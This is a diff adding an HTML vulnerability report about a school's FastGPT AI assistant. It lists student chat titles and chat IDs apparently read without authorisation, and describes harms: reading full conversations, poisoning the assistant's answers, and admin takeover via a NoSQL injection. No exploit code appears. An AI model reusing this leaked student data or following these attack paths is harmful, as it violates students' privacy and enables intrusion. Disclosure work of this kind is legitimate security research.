+<tr><td>324</td><td class='tt'>喝的热水在哪</td><td class='tm'>2026-09-11</td><td class='tm'>wNgDiGTyHRFdUmMl38DT7sri</td></tr>
+<tr><td>325</td><td class='tt'>我在中尧</td><td class='tm'>2026-09-11</td><td class='tm'>nHLSVWjWsgvOikXI6v7JvvCa</td></tr>
+<tr><td>326</td><td class='tt'>？</td><td class='tm'>2026-09-11</td><td class='tm'>l5wJ1mtcMM6SNBSynRpttbLA</td></tr>
+<tr><td>327</td><td class='tt'>国家助学贷款</td><td class='tm'>2026-09-10</td><td class='tm'>oWm4c157rOOTdEiuHyS2Dzyg</td></tr>
+<tr><td>328</td><td class='tt'>助学金，家庭经济困难 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-10</td><td class='tm'>pYCyd3hFoO0N3AZ9mADRb6Vl</td></tr>
+<tr><td>329</td><td class='tt'>资助</td><td class='tm'>2026-09-10</td><td class='tm'>e5wzuDPn9Oa7aHh9ejG19UkF</td></tr>
+<tr><td>330</td><td class='tt'>校车没有公假可以上去坐吗</td><td class='tm'>2026-09-10</td><td class='tm'>ynKaqZMQsEpdsm2NxI6Rt7bI</td></tr>
+<tr><td>331</td><td class='tt'>粮食与管理学院</td><td class='tm'>2026-09-10</td><td class='tm'>zbYcXdI4mS3m7vlBDh3uf21q</td></tr>
+<tr><td>332</td><td class='tt'>粮油与管理专业名称。</td><td class='tm'>2026-09-10</td><td class='tm'>u25ICoTvgrTL8XyLXg96gpt9</td></tr>
+<tr><td>333</td><td class='tt'>校园网怎么弄</td><td class='tm'>2026-09-10</td><td class='tm'>nHO7LwXFzi6E3jXOzbuakP20</td></tr>
+<tr><td>334</td><td class='tt'>我生病了</td><td class='tm'>2026-09-10</td><td class='tm'>psAQMRR9r0WDcwNkHM08DBqx</td></tr>
+<tr><td>335</td><td class='tt'>计算机应用技术专业必修课有几门？</td><td class='tm'>2026-09-10</td><td class='tm'>o00gq15wywDMFyrpbcFlu5nA</td></tr>
+<tr><td>336</td><td class='tt'>我的专业必修课有几门？</td><td class='tm'>2026-09-10</td><td class='tm'>qd4dwE1pLm9R9fMVJRBp67sD</td></tr>
+<tr><td>337</td><td class='tt'>宿舍插座用电报修怎么处理</td><td class='tm'>2026-09-10</td><td class='tm'>xS8lSvsN6L9WgjdiXdP1Tp8H</td></tr>
+<tr><td>338</td><td class='tt'>我们学校要修多少学分呀</td><td class='tm'>2026-09-10</td><td class='tm'>ftSosqnbec4So9zZN4gGj3ki</td></tr>
+<tr><td>339</td><td class='tt'>网上办事大厅</td><td class='tm'>2026-09-10</td><td class='tm'>xUKly0JudpBcFasUxgKSnCVX</td></tr>
+<tr><td>340</td><td class='tt'>几点有热水啊</td><td class='tm'>2026-09-10</td><td class='tm'>aqT7NtkKiAL4ybTfZ9OKV5U0</td></tr>
+<tr><td>341</td><td class='tt'>我办理了助学贷款 然后家里收入不稳定 想</td><td class='tm'>2026-09-10</td><td class='tm'>nj2CDFyZSa9c3PEjV19lJ2Re</td></tr>
+<tr><td>342</td><td class='tt'>申请就读证明</td><td class='tm'>2026-09-10</td><td class='tm'>cTFNiHvEe4Zk5W5BLsPtVy9c</td></tr>
+<tr><td>343</td><td class='tt'>怎么申请就读证明</td><td class='tm'>2026-09-10</td><td class='tm'>oMTIg1dxPTIS595TKvHB1Cp1</td></tr>
+<tr><td>344</td><td class='tt'>就读证明</td><td class='tm'>2026-09-10</td><td class='tm'>aFoThP6AaQhegNUa2d4cjOqw</td></tr>
+<tr><td>345</td><td class='tt'>在哪进行校内线上点餐</td><td class='tm'>2026-09-10</td><td class='tm'>yFn9qQg3aIMoXsUSONvdMH93</td></tr>
+<tr><td>346</td><td class='tt'>粮油与管理学院可以换到人工智能学院去吗</td><td class='tm'>2026-09-10</td><td class='tm'>fU1nbOoIDYesU1VxQmtX81lK</td></tr>
+<tr><td>347</td><td class='tt'>马上毕业我二课积分不够60分，怎么办</td><td class='tm'>2026-09-10</td><td class='tm'>fAFg5dRnkbauR33c29ALr7Dl</td></tr>
+<tr><td>348</td><td class='tt'>怎么下载</td><td class='tm'>2026-09-10</td><td class='tm'>y32RwI21Yc8ezThfAQ5GlO2F</td></tr>
+<tr><td>349</td><td class='tt'>麻烦吗，具体流程是什么样的</td><td class='tm'>2026-09-10</td><td class='tm'>utrIdv6u350z5H5vxOVRYEX0</td></tr>
+<tr><td>350</td><td class='tt'>未看见有下载PDF版本的盖章</td><td class='tm'>2026-09-10</td><td class='tm'>pI2B6AyX01TuAfVIu24Zr9YQ</td></tr>
+<tr><td>351</td><td class='tt'>在哪里下载PDF版本的盖章</td><td class='tm'>2026-09-10</td><td class='tm'>aJIOLGafblBB1Vix700kUOoe</td></tr>
+<tr><td>352</td><td class='tt'>房卡不见了咋办</td><td class='tm'>2026-09-10</td><td class='tm'>riQpN2L3WZSGGae3AD2wuOJt</td></tr>
+<tr><td>353</td><td class='tt'>学生在校证明怎么打印</td><td class='tm'>2026-09-10</td><td class='tm'>mUTJ0uz6cjDxiqGkzXGtnDFM</td></tr>
+<tr><td>354</td><td class='tt'>学生证明打印该去哪里</td><td class='tm'>2026-09-10</td><td class='tm'>vKI7HJeUY0n5LkydDVKZB6lk</td></tr>
+<tr><td>355</td><td class='tt'>学生证明打印都是每个学生都要吗？</td><td class='tm'>2026-09-10</td><td class='tm'>kSbnenNfpRd7rjEEKRlU0KLm</td></tr>
+<tr><td>356</td><td class='tt'>是一个月内提交材料吗？然后开始评定对吧？</td><td class='tm'>2026-09-10</td><td class='tm'>krOTk1eNpou5H54hcZTbOtHR</td></tr>
+<tr><td>357</td><td class='tt'>去医务室买要要预约吗</td><td class='tm'>2026-09-10</td><td class='tm'>msOulqGUpjQmP8rihrxMfC0b</td></tr>
+<tr><td>358</td><td class='tt'>什么时候考四六级</td><td class='tm'>2026-09-10</td><td class='tm'>nCVHyBW1sNithXdYV9BD92iY</td></tr>
+<tr><td>359</td><td class='tt'>退学之后学费还能退回来吗</td><td class='tm'>2026-09-10</td><td class='tm'>hAqkwPJJyMBuX822fHFrAn5g</td></tr>
+<tr><td>360</td><td class='tt'>在读证明怎么办</td><td class='tm'>2026-09-09</td><td class='tm'>yztelvf9iXL3XBAuQuBYP8YD</td></tr>
+<tr><td>361</td><td class='tt'>我怎么弄学生证明</td><td class='tm'>2026-09-09</td><td class='tm'>sXVk9LDIx9LRNGoCDn92bDMo</td></tr>
+<tr><td>362</td><td class='tt'>录取分数线多少</td><td class='tm'>2026-09-09</td><td class='tm'>vQmFrn9Na9W3saZ0XtFTXaLL</td></tr>
+<tr><td>363</td><td class='tt'>心理测试在哪里？ <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-09</td><td class='tm'>n8lWK8knusChF04FjIQsCtMX</td></tr>
+<tr><td>364</td><td class='tt'>在校证明怎么在今日校园上弄？</td><td class='tm'>2026-09-09</td><td class='tm'>zu940Gw7E9uUxrEMTA3K8sEw</td></tr>
+<tr><td>365</td><td class='tt'>怎么知道学号</td><td class='tm'>2026-09-09</td><td class='tm'>a9evsrHXjbZy6HlzUlXoeVKf</td></tr>
+<tr><td>366</td><td class='tt'>我想知道怎么样才可以退学</td><td class='tm'>2026-09-09</td><td class='tm'>m8gigq7x4tf1JJPNzdHJXSyt</td></tr>
+<tr><td>367</td><td class='tt'>2024级计算机应用技术学生，2024-</td><td class='tm'>2026-09-09</td><td class='tm'>tEx6TqRMf8AekYeorB6yTvmj</td></tr>
+<tr><td>368</td><td class='tt'>宿舍插线板没电</td><td class='tm'>2026-09-09</td><td class='tm'>ku57gTE3xKBB9xdprATjU7V9</td></tr>
+<tr><td>369</td><td class='tt'>怎么交电费</td><td class='tm'>2026-09-09</td><td class='tm'>iSC4cQaJYsKiUzSD72BnBQHJ</td></tr>
+<tr><td>370</td><td class='tt'>推荐一下书</td><td class='tm'>2026-09-09</td><td class='tm'>ouKZI0doH5cCZbc4o4rch0af</td></tr>
+<tr><td>371</td><td class='tt'>证明打印怎么申请</td><td class='tm'>2026-09-09</td><td class='tm'>l2dVdIpJdGI1dC42sbj3i3te</td></tr>
+<tr><td>372</td><td class='tt'>你好</td><td class='tm'>2026-09-09</td><td class='tm'>aZBrvrG5hOm6BgkriLm2eZAn</td></tr>
+<tr><td>373</td><td class='tt'>大概什么时候放假</td><td class='tm'>2026-09-09</td><td class='tm'>wExPt8lthx5MVxlR1ohWDVwe</td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <h2>四、危害说明</h2>
+  <ul class="harm">
+    <li><b>大规模学生个人信息泄露：</b>匿名即可读取全校 373 条真实对话记录，内容覆盖学生在校证明办理、请假、奖助学金（助学金/励志奖学金资格）、休学申请、宿舍分配等教务与学工数据；多条记录标题即包含学生个人境遇描述（如心理咨询、家庭矛盾），属敏感个人信息，违反《个人信息保护法》对未成年人/在校生敏感信息的保护要求。</li>
+    <li><b>对话全文可被进一步读取：</b>利用返回的 chatId 调用对话详情接口即可读取任意会话完整上下文，师生在其中提交的个人信息、账号问题描述（含密码相关咨询）将被完整获取，可用于精准社工与钓鱼。</li>
+    <li><b>上下文投毒与答问操纵：</b>攻击者可结合该校其他接口（如未授权共享链接）向师生高频咨询场景投毒，操纵 AI 助手回答，影响学校正常管理与学生决策。</li>
+    <li><b>与其他漏洞叠加：</b>该系统同类接口的注入面可用于探测其他未授权读写路径，且该 FastGPT 版本低于 4.14.9.5，同平台的登录 NoSQL 注入（CVE-2026-40351）同样存在，可进一步接管管理员账号。</li>
+  </ul>
+</div>
+
+<div class="foot">取证人：indifference108 · 2026-10-09 · 全部数据仅作漏洞证明用途，已脱敏处理</div>
+</div>
+</body>
+</html>
